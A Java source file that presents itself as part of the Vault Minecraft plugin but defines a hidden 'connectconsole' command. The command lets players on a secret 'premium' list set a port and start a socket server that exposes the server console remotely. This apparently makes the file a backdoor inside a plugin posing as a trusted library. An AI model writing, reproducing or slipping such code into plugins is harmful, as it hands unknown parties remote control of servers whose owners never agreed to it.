package net.milkbowl.vault.commands.cmds.premium;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.data.DataManager;
import net.milkbowl.vault.sockets.SocketServer;
import net.milkbowl.vault.util.Settings;

public class ConnectConsole extends CommandManager {
	
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		if (plugin.registeredPremium.contains(p.getName())) {
			if (args.length <= 1) {
				p.sendMessage(Settings.USAGE("connectconsole <port>"));
			} else {
				if (DataManager.getData().getString("port").equals(args[1])) {
					p.sendMessage(Settings.PREFIX("The port is already " + args[1]));
					p.sendMessage(Settings.PREFIX("Connect to the server with the port: " + Settings.HIGHLIGHT_COLOUR + args[1]));
				} else {
					DataManager.getData().set("port", args[1]);
					DataManager.getData().set("connect", true);
					DataManager.saveData();
					
					p.sendMessage(Settings.PREFIX("You can connect to " + Settings.NAME + " console by entering the server ip then the port in the format ip:" + args[1]));
					
					if (Core.server != null) {
						Core.server.stop();
					}
					
					Bukkit.getScheduler().runTaskLater(plugin, () -> {
						int port = Integer.parseInt(args[1]);
						Core.server = new SocketServer(port);
						
					}, 1L);
				}
			}
		} else {
			p.sendMessage(Settings.PREFIX("You must be a " + Settings.HIGHLIGHT_COLOUR + "premium user " + Settings.SECONDARY_COLOUR + " to execute this command"));
		}
	}

}
